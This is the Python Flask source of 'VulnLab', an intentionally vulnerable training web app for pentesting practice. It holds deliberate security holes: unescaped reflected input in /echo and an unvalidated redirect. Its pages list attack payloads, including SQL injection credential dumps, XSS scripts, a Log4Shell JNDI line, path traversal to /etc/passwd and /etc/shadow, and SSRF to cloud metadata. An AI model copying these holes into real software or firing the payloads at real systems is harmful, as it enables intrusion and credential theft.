"""
=============================================================
  INTENTIONALLY VULNERABLE WEB LAB - FOR EDUCATIONAL USE ONLY
  ⚠️  DO NOT DEPLOY ON A PUBLIC SERVER ⚠️
  All vulnerabilities are SIMULATED with static responses.
  No real file reads, no real RCE, no external requests.
=============================================================
"""

from flask import Flask, request, redirect, make_response, render_template_string
import html  # used intentionally NOT used in some endpoints to simulate XSS

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────
#  SHARED LAYOUT HELPERS
# ─────────────────────────────────────────────────────────────

WARNING_BANNER = """
<div style="background:#ff0;color:#000;text-align:center;padding:8px;font-weight:bold;
            font-family:monospace;border-bottom:2px solid #f00;">
  ⚠️  INTENTIONALLY VULNERABLE – FOR EDUCATIONAL USE ONLY  ⚠️
</div>
"""

NAV = """
<nav style="background:#1a1a2e;padding:12px 24px;display:flex;gap:16px;flex-wrap:wrap;
            font-family:monospace;font-size:13px;">
  <a href="/" style="color:#00d4ff;text-decoration:none;">🏠 Home</a>
  <a href="/.env" style="color:#ff6b6b;">⚙️ .env leak</a>
  <a href="/.git/config" style="color:#ff6b6b;">📁 .git/config</a>
  <a href="/admin" style="color:#ff6b6b;">🔒 /admin</a>
  <a href="/uploads/" style="color:#ff6b6b;">📂 /uploads</a>
  <a href="/config.json" style="color:#ff6b6b;">🔑 config.json</a>
  <a href="/wp-plugin" style="color:#ffa500;">🔌 wp-plugin</a>
  <a href="/log4j-test" style="color:#ffa500;">🪲 log4j</a>
  <a href="/search?q=test" style="color:#a8ff78;">💉 SQLi</a>
  <a href="/echo?msg=hello" style="color:#a8ff78;">📢 XSS</a>
  <a href="/fetch?url=https://example.com" style="color:#a8ff78;">🌐 SSRF</a>
  <a href="/page?file=index.html" style="color:#a8ff78;">📄 LFI</a>
  <a href="/redirect?next=https://example.com" style="color:#a8ff78;">↩️ Redirect</a>
</nav>
"""

def page(title, body, extra_headers=None):
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{title} | VulnLab</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ background: #0d0d1a; color: #e0e0e0; font-family: 'Courier New', monospace; }}
    .container {{ max-width: 900px; margin: 32px auto; padding: 0 24px; }}
    h1 {{ color: #00d4ff; margin-bottom: 16px; font-size: 1.6rem; }}
    h2 {{ color: #ff6b6b; margin: 24px 0 12px; }}
    pre {{ background: #12122a; border: 1px solid #333; border-radius: 6px;
           padding: 16px; overflow-x: auto; color: #a8ff78; line-height: 1.5; }}
    .badge {{ display:inline-block;padding:3px 10px;border-radius:12px;
              font-size:11px;font-weight:bold;margin-bottom:12px; }}
    .badge-red {{ background:#ff4444;color:#fff; }}
    .badge-orange {{ background:#ff8800;color:#fff; }}
    .badge-green {{ background:#00cc66;color:#fff; }}
    .badge-blue  {{ background:#0099ff;color:#fff; }}
    p {{ margin-bottom:12px;line-height:1.6; }}
    ul {{ margin-left:20px;line-height:1.8; }}
    a {{ color:#00d4ff; }}
    table {{ width:100%;border-collapse:collapse;margin-top:12px; }}
    th,td {{ border:1px solid #333;padding:8px 12px;text-align:left; }}
    th {{ background:#12122a;color:#00d4ff; }}
    tr:nth-child(even) {{ background:#0a0a1a; }}
    .endpoint {{ background:#12122a;border-left:4px solid #00d4ff;
                 padding:12px 16px;margin-bottom:8px;border-radius:0 6px 6px 0; }}
    form {{ background:#12122a;padding:24px;border-radius:8px;margin-top:16px; }}
    input[type=text],input[type=password] {{ background:#1a1a3a;border:1px solid #444;
      color:#e0e0e0;padding:8px 12px;border-radius:4px;width:100%;margin:8px 0 16px;font-size:14px; }}
    button {{ background:#00d4ff;color:#000;border:none;padding:10px 24px;
              border-radius:4px;cursor:pointer;font-weight:bold;font-size:14px; }}
    button:hover {{ background:#00b8d9; }}
  </style>
</head>
<body>
{WARNING_BANNER}
{NAV}
<div class="container">
{body}
</div>
</body>
</html>"""
    resp = make_response(html_content)
    # CVE Fingerprint header on every response
    resp.headers['X-Jenkins'] = '2.150'
    resp.headers['X-Powered-By'] = 'VulnLab/1.0'
    resp.headers['Server'] = 'VulnLab-Apache/2.4.49'
    if extra_headers:
        for k, v in extra_headers.items():
            resp.headers[k] = v
    return resp


# ─────────────────────────────────────────────────────────────
#  HOME
# ─────────────────────────────────────────────────────────────

@app.route('/')
def index():
    body = """
<h1>🔬 VulnLab – Web Pentesting Training Environment</h1>
<span class="badge badge-red">INTENTIONALLY VULNERABLE</span>
<span class="badge badge-blue">EDUCATIONAL USE ONLY</span>

<p style="margin-top:16px;">
  Welcome to <strong>VulnLab</strong> — a fully isolated, Docker-based web pentesting
  playground. Every endpoint simulates a real-world vulnerability pattern using
  <em>static, hardcoded responses only</em>. No real files are read, no real commands
  are executed, and no external requests are made.
</p>

<h2>📋 Vulnerability Modules</h2>
<table>
  <tr><th>Category</th><th>Vulnerability</th><th>Endpoint</th></tr>
  <tr><td>Misconfiguration</td><td>Exposed .env file</td><td><a href="/.env">/.env</a></td></tr>
  <tr><td>Misconfiguration</td><td>Exposed .git/config</td><td><a href="/.git/config">/.git/config</a></td></tr>
  <tr><td>Misconfiguration</td><td>Default credentials admin panel</td><td><a href="/admin">/admin</a></td></tr>
  <tr><td>Misconfiguration</td><td>Directory listing</td><td><a href="/uploads/">/uploads/</a></td></tr>
  <tr><td>Misconfiguration</td><td>Exposed API config</td><td><a href="/config.json">/config.json</a></td></tr>
  <tr><td>CVE Fingerprint</td><td>Vulnerable plugin version</td><td><a href="/wp-plugin">/wp-plugin</a></td></tr>
  <tr><td>CVE Fingerprint</td><td>Log4Shell simulation</td><td><a href="/log4j-test">/log4j-test</a></td></tr>
  <tr><td>CVE Fingerprint</td><td>Jenkins header</td><td>Every response (X-Jenkins: 2.150)</td></tr>
  <tr><td>Injection</td><td>SQL Injection (error-based)</td><td><a href="/search?q=test">/search?q=</a></td></tr>
  <tr><td>Injection</td><td>Reflected XSS</td><td><a href="/echo?msg=hello">/echo?msg=</a></td></tr>
  <tr><td>Injection</td><td>SSRF simulation</td><td><a href="/fetch?url=https://example.com">/fetch?url=</a></td></tr>
  <tr><td>Injection</td><td>LFI simulation</td><td><a href="/page?file=index.html">/page?file=</a></td></tr>
  <tr><td>Logic</td><td>Open Redirect</td><td><a href="/redirect?next=https://example.com">/redirect?next=</a></td></tr>
</table>

<h2>⚙️ Lab Info</h2>
<pre>Host   : 127.0.0.1 (localhost only)
Port   : 8080
Docker : Isolated network – no external reach
Reset  : docker compose restart</pre>
"""
    return page("Home", body)


# ─────────────────────────────────────────────────────────────
#  A. MISCONFIGURATION SIMULATIONS
# ─────────────────────────────────────────────────────────────

@app.route('/.env')
def dotenv():
    """Simulate an accidentally exposed .env file."""
    content = (
        "APP_ENV=production\n"
        "APP_DEBUG=false\n"
        "DB_HOST=db.internal\n"
        "DB_PORT=5432\n"
        "DB_NAME=appdb\n"
        "DB_USER=appuser\n"
        "DB_PASSWORD=DUMMY_DB_PASS\n"
        "AWS_ACCESS_KEY_ID=FAKE_ACCESS_KEY_000\n"
        "AWS_SECRET_ACCESS_KEY=FAKE_SECRET_000\n"
        "JWT_SECRET=DUMMY_JWT_SECRET_XYZ\n"
        "STRIPE_SECRET_KEY=FAKE_STRIPE_KEY_000\n"
        "SENDGRID_API_KEY=FAKE_SG_KEY_0000000\n"
    )
    resp = make_response(content, 200)
    resp.headers['Content-Type'] = 'text/plain'
    resp.headers['X-Jenkins'] = '2.150'
    return resp


@app.route('/.git/config')
def git_config():
    """Simulate an exposed .git/config — reveals fake remote URL with embedded creds."""
    content = (
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = false\n"
        "\tbare = false\n"
        "\tlogallrefupdates = true\n"
        "\tsymlinks = false\n"
        "\tignorecase = true\n"
        "[remote \"origin\"]\n"
        "\turl = https://DUMMY_GIT_USER:DUMMY_GIT_TOKEN@github.com/fake-org/private-repo.git\n"
        "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
        "[branch \"main\"]\n"
        "\tremote = origin\n"
        "\tmerge = refs/heads/main\n"
        "[user]\n"
        "\tname = Dummy Developer\n"
        "\temail = dev@dummy-corp.internal\n"
    )
    resp = make_response(content, 200)
    resp.headers['Content-Type'] = 'text/plain'
    resp.headers['X-Jenkins'] = '2.150'
    return resp


@app.route('/admin', methods=['GET', 'POST'])
def admin():
    """Default credentials page: admin / admin123"""
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if username == 'admin' and password == 'admin123':
            body = """
<h1>🔓 Admin Panel – Access Granted</h1>
<span class="badge badge-red">DEFAULT CREDENTIALS ACCEPTED</span>
<p>You authenticated with <strong>admin:admin123</strong> — a classic default credential pair.</p>
<h2>🏴 Flag</h2>
<pre>FLAG{default_creds_are_dangerous_DUMMY}</pre>
<h2>Simulated Admin Data</h2>
<pre>{
  "users": 1482,
  "revenue": "DUMMY_VALUE",
  "last_backup": "2024-01-01",
  "admin_token": "FAKE_ADMIN_TOKEN_ABC123"
}</pre>
<p><a href="/admin">← Back to login</a></p>
"""
        else:
            body = """
<h1>🔒 Admin Login</h1>
<span class="badge badge-orange">HINT: Try default credentials</span>
<form method="POST" action="/admin">
  <label>Username</label>
  <input type="text" id="admin-user" name="username" placeholder="admin" autocomplete="off">
  <label>Password</label>
  <input type="password" id="admin-pass" name="password" placeholder="password">
  <button type="submit">Login</button>
</form>
<p style="color:#ff6b6b;margin-top:12px;">Invalid credentials. Try again.</p>
"""
        return page("Admin Panel", body)

    body = """
<h1>🔒 Admin Login</h1>
<span class="badge badge-orange">MISCONFIGURATION: Default Credentials</span>
<p>This panel uses factory-default credentials that were never changed.</p>
<form method="POST" action="/admin">
  <label>Username</label>
  <input type="text" id="admin-user" name="username" placeholder="admin" autocomplete="off">
  <label>Password</label>
  <input type="password" id="admin-pass" name="password" placeholder="password">
  <button type="submit" id="admin-submit">Login</button>
</form>
<p style="color:#888;margin-top:12px;font-size:12px;">Hint: Try <code>admin</code> / <code>admin123</code></p>
"""
    return page("Admin Panel", body)


@app.route('/uploads/')
@app.route('/uploads')
def uploads():
    """Simulate directory listing of an uploads folder."""
    body = """
<h1>📂 Index of /uploads/</h1>
<span class="badge badge-red">DIRECTORY LISTING ENABLED</span>
<p>The web server is configured with <code>Options +Indexes</code>, exposing file contents.</p>
<pre>
Name                          Last modified         Size
──────────────────────────────────────────────────────────
../
backup_2024-01-01.zip         2024-01-01 03:00      4.2M
database_dump.sql             2024-01-15 14:22     18.7M
internal_report_Q4.pdf        2024-01-20 09:11      2.1M
config_backup.tar.gz          2024-01-22 00:00      1.3M
users_export.csv              2024-01-25 08:55    512.0K
private_key.pem               2024-01-25 08:56      3.2K
wp-config.php.bak             2024-01-26 11:30      8.4K
</pre>
<p style="color:#ff6b6b;margin-top:12px;">
  ⚠️ All files above are <strong>simulated</strong> — no real files exist on disk.
</p>
"""
    return page("/uploads/ – Directory Listing", body)


@app.route('/config.json')
def config_json():
    """Simulate an exposed config.json with API keys."""
    import json
    data = {
        "app": "VulnLab",
        "version": "1.0.0",
        "environment": "production",
        "api": {
            "key": "FAKE_API_KEY_12345",
            "endpoint": "https://api.dummy-corp.internal/v2",
            "timeout": 30
        },
        "database": {
            "host": "db.internal",
            "port": 5432,
            "name": "appdb",
            "password": "DUMMY_DB_PASS"
        },
        "stripe": {
            "publishable": "FAKE_STRIPE_PK_000",
            "secret": "FAKE_STRIPE_SK_000"
        },
        "slack_webhook": "https://hooks.slack.com/services/FAKE/WEBHOOK/TOKEN000",
        "github_token": "FAKE_GH_TOKEN_000000000000000000000"
    }
    resp = make_response(json.dumps(data, indent=2), 200)
    resp.headers['Content-Type'] = 'application/json'
    resp.headers['X-Jenkins'] = '2.150'
    return resp


# ─────────────────────────────────────────────────────────────
#  B. CVE FINGERPRINT SIMULATIONS
# ─────────────────────────────────────────────────────────────

@app.route('/wp-plugin')
def wp_plugin():
    """Simulate a WordPress plugin version disclosure with a known CVE reference."""
    body = """
<h1>🔌 WordPress Plugin Endpoint</h1>
<span class="badge badge-orange">CVE FINGERPRINT SIMULATION</span>
<p>This endpoint simulates a vulnerable WordPress plugin version disclosure.</p>

<pre>Plugin: Contact Form Pro
Version: 1.2.3
Status: Active
CVE Reference: CVE-2022-XXXX (SQL Injection via unauthenticated request)

Vulnerable Plugin Version: 1.2.3 (CVE-2022-XXXX)

Plugin Path: /wp-content/plugins/contact-form-pro/
Author: Dummy Author &lt;dummy@example.com&gt;
Last Updated: 2022-03-01
Min WP Version: 5.0</pre>

<h2>Simulated Advisory</h2>
<pre>Title: SQL Injection in Contact Form Pro &lt;= 1.2.3
Severity: HIGH (CVSS: 8.8)
Vector: NETWORK / LOW / NONE / NONE
Fix: Update to version 1.2.4 or later
Reference: https://example.com/advisory/CVE-2022-XXXX (SIMULATED)</pre>
"""
    return page("WP Plugin – CVE Fingerprint", body)


@app.route('/log4j-test')
def log4j_test():
    """Simulate Log4Shell (CVE-2021-44228) JNDI lookup error disclosure."""
    body = """
<h1>🪲 Log4j JNDI Test Endpoint</h1>
<span class="badge badge-red">CVE-2021-44228 SIMULATION</span>
<p>
  This endpoint simulates the Log4Shell vulnerability — it echoes back the JNDI
  payload as an error message without executing it.
</p>

<pre>ERROR 2024-01-01 00:00:00,000 [main] log4j.core.net.JndiLookup
Error: JNDI lookup attempted: ${{jndi:ldap://dummy-server/a}}

log4j2 version : 2.14.1 (VULNERABLE – simulation only)
Lookup blocked : false (simulation)
RCE executed   : ❌ NO – response is static/hardcoded

Affected versions: log4j-core 2.0-beta9 through 2.14.1
Patch: Upgrade to 2.17.1 or later
CVE: CVE-2021-44228 (CVSS 10.0 – CRITICAL)</pre>

<h2>Try it</h2>
<pre>curl -H 'X-Api-Version: ${{jndi:ldap://dummy-server/a}}' http://localhost:8080/log4j-test</pre>
"""
    return page("Log4j Test – CVE Simulation", body)


# ─────────────────────────────────────────────────────────────
#  C. WEB VULNERABILITY PATTERN SIMULATIONS
# ─────────────────────────────────────────────────────────────

@app.route('/search')
def search():
    """
    SQL Injection simulation (error-based).
    If the query parameter contains a single quote, return a fake DB error.
    """
    q = request.args.get('q', '')

    if "'" in q or '"' in q or '--' in q or ';' in q or '1=1' in q.lower() or 'union' in q.lower():
        body = f"""
<h1>🔍 Search Results</h1>
<span class="badge badge-red">SQL INJECTION DETECTED</span>
<p>Your query: <code>{html.escape(q)}</code></p>
<pre>MySQL Error: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version
for the right syntax to use near '{html.escape(q)}' at line 1

Query: SELECT * FROM products WHERE name LIKE '%{html.escape(q)}%'

Error Code: 1064
SQLSTATE: 42000</pre>
<h2>What happened?</h2>
<p>
  The application passed your input directly into an SQL query without parameterisation.
  A single quote (<code>'</code>) breaks out of the string literal, causing a syntax error.
  In a real application, an attacker could use this to dump the entire database.
</p>
<pre>Payloads to try:
  ' OR 1=1--
  ' UNION SELECT null,username,password FROM users--
  ' AND SLEEP(5)--</pre>
"""
    else:
        # Safe path — show a normal search result
        safe_q = html.escape(q)
        body = f"""
<h1>🔍 Search Results for: {safe_q}</h1>
<span class="badge badge-green">No Injection Detected</span>
<p>Try adding a single quote to your query to trigger the SQL error simulation.</p>
<p>Example: <a href="/search?q=test'">/search?q=test'</a></p>
<pre>SELECT * FROM products WHERE name LIKE '%{safe_q}%'
→ 0 results returned (simulated empty DB)</pre>
"""
    return page("Search – SQLi Simulation", body)


@app.route('/echo')
def echo():
    """
    Reflected XSS simulation.
    The msg parameter is reflected without HTML encoding on purpose.
    """
    msg = request.args.get('msg', '')

    # INTENTIONALLY NOT escaping to simulate XSS
    body = f"""
<h1>📢 Echo</h1>
<span class="badge badge-red">REFLECTED XSS – UNESCAPED OUTPUT</span>
<p>Your message has been reflected below without sanitisation:</p>
<div style="background:#12122a;border:1px solid #ff6b6b;border-radius:6px;padding:16px;margin:16px 0;">
  {msg}
</div>
<h2>Try it</h2>
<pre>Payload: &lt;script&gt;alert('XSS')&lt;/script&gt;
URL: /echo?msg=&lt;script&gt;alert('XSS')&lt;/script&gt;
Or: /echo?msg=&lt;img src=x onerror=alert(1)&gt;</pre>
<p>The <code>msg</code> parameter is inserted into the DOM raw — a classic reflected XSS.</p>
"""
    return page("Echo – XSS Simulation", body)


@app.route('/fetch')
def fetch():
    """
    SSRF simulation.
    If the url param targets the AWS metadata IP, return a fake metadata response.
    No real HTTP requests are ever made.
    """
    url = request.args.get('url', '')

    if '169.254.169.254' in url or 'metadata' in url.lower() or '::1' in url or \
       'localhost' in url.lower() or '0.0.0.0' in url or '127.' in url:
        body = f"""
<h1>🌐 URL Fetch Result</h1>
<span class="badge badge-red">SSRF – INTERNAL RESOURCE ACCESS</span>
<p>Requested URL: <code>{html.escape(url)}</code></p>
<pre>HTTP/1.1 200 OK
Content-Type: text/plain

# AWS Instance Metadata (SIMULATED)
AWS Metadata Response: FAKE_INSTANCE_ID=i-123456
ami-id: ami-0abcdef1234567890
instance-type: t3.micro
local-ipv4: 10.0.1.100
placement/availability-zone: us-east-1a
iam/security-credentials/ec2-role:
  AccessKeyId    : FAKE_ACCESS_KEY_ID_META
  SecretAccessKey: FAKE_SECRET_KEY_META_000
  Token          : FAKE_SESSION_TOKEN_000
  Expiration     : 2099-01-01T00:00:00Z</pre>
<h2>What happened?</h2>
<p>
  The server fetched a URL supplied by the user without validating it.
  An attacker can point it at the EC2 metadata endpoint to steal IAM credentials.
  <strong>No real HTTP request was made — this is a static simulation.</strong>
</p>
"""
    else:
        safe_url = html.escape(url)
        body = f"""
<h1>🌐 URL Fetch Result</h1>
<span class="badge badge-orange">SSRF – EXTERNAL URL (BLOCKED IN LAB)</span>
<p>Requested URL: <code>{safe_url}</code></p>
<pre>Simulated Response: 200 OK
Content-Type: text/html; charset=utf-8
Body: [simulated external page content]

Note: No real HTTP request was made by this lab server.</pre>
<h2>Try SSRF</h2>
<p>Try: <a href="/fetch?url=http://169.254.169.254/latest/meta-data/">/fetch?url=http://169.254.169.254/latest/meta-data/</a></p>
"""
    return page("Fetch – SSRF Simulation", body)


@app.route('/page')
def lfi():
    """
    LFI simulation.
    If the file param contains path traversal or /etc/passwd, return fake file content.
    No real files are ever read from the filesystem.
    """
    filename = request.args.get('file', 'index.html')

    if 'etc/passwd' in filename or '../' in filename or '..\\' in filename or \
       'etc/shadow' in filename or 'proc/' in filename or 'windows/win.ini' in filename.lower():
        body = f"""
<h1>📄 Page Include Result</h1>
<span class="badge badge-red">LFI – LOCAL FILE INCLUSION</span>
<p>Requested file: <code>{html.escape(filename)}</code></p>
<pre>root:x:0:0:dummy-root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
vulnlab:x:1000:1000:VulnLab User:/home/vulnlab:/bin/bash
mysql:x:999:999:MySQL Server:/var/lib/mysql:/bin/false</pre>
<h2>What happened?</h2>
<p>
  The <code>file</code> parameter was passed directly to a file include function
  without path validation. An attacker can traverse directories with <code>../</code>
  to read sensitive system files.
  <strong>No real file was read — this is a static simulation.</strong>
</p>
<pre>Payloads to try:
  /page?file=../../../../etc/passwd
  /page?file=/etc/shadow
  /page?file=/proc/self/environ</pre>
"""
    else:
        safe_file = html.escape(filename)
        body = f"""
<h1>📄 Page Include</h1>
<span class="badge badge-green">Normal File Request</span>
<p>Requesting file: <code>{safe_file}</code></p>
<pre>[Simulated content of {safe_file}]
&lt;!DOCTYPE html&gt;
&lt;html&gt;&lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt;</pre>
<h2>Try LFI</h2>
<p>Try: <a href="/page?file=../../../../etc/passwd">/page?file=../../../../etc/passwd</a></p>
"""
    return page("Page – LFI Simulation", body)


@app.route('/redirect')
def open_redirect():
    """
    Open Redirect simulation.
    Performs an unvalidated redirect to the `next` parameter.
    """
    next_url = request.args.get('next', '/')

    # Simulate the redirect — in a real vulnerable app this would just Location: header
    body = f"""
<h1>↩️ Open Redirect</h1>
<span class="badge badge-red">OPEN REDIRECT – UNVALIDATED</span>
<p>Redirecting to: <code>{html.escape(next_url)}</code></p>
<p>
  This endpoint redirects to any URL without validation.
  Attackers use this to craft convincing phishing links that appear to originate
  from a trusted domain.
</p>
<pre>Request : GET /redirect?next=https://evil.com/fake-login
Response: HTTP/1.1 302 Found
          Location: https://evil.com/fake-login

Victim sees: https://trusted-site.com/redirect?next=https://evil.com/fake-login
             ↑ looks safe              ↑ actually goes here</pre>
<p>
  <a href="{html.escape(next_url)}" id="redirect-link" style="color:#ff6b6b;">
    Click here to follow the redirect →
  </a>
</p>
<h2>Try it</h2>
<p><a href="/redirect?next=https://example.com">/redirect?next=https://example.com</a></p>
"""
    resp = make_response(page("Open Redirect", body).data, 302)
    resp.headers['Location'] = next_url
    resp.headers['X-Jenkins'] = '2.150'
    return resp


# ─────────────────────────────────────────────────────────────
#  HEALTH CHECK
# ─────────────────────────────────────────────────────────────

@app.route('/health')
def health():
    import json
    resp = make_response(json.dumps({"status": "ok", "lab": "VulnLab", "version": "1.0.0"}), 200)
    resp.headers['Content-Type'] = 'application/json'
    return resp


# ─────────────────────────────────────────────────────────────
#  404 HANDLER — also simulates information disclosure
# ─────────────────────────────────────────────────────────────

@app.errorhandler(404)
def not_found(e):
    body = f"""
<h1>404 – Page Not Found</h1>
<span class="badge badge-orange">INFORMATION DISCLOSURE IN ERROR PAGE</span>
<p>The page you requested was not found. Note how this error page reveals:</p>
<pre>Server    : VulnLab-Apache/2.4.49
Framework : Flask/3.x (Python 3.x)
Path      : {html.escape(request.path)}
Method    : {request.method}
Host      : {html.escape(request.host)}</pre>
<p><a href="/">← Return to Home</a></p>
"""
    resp = page("404 – Not Found", body)
    resp.status_code = 404
    return resp


# ─────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
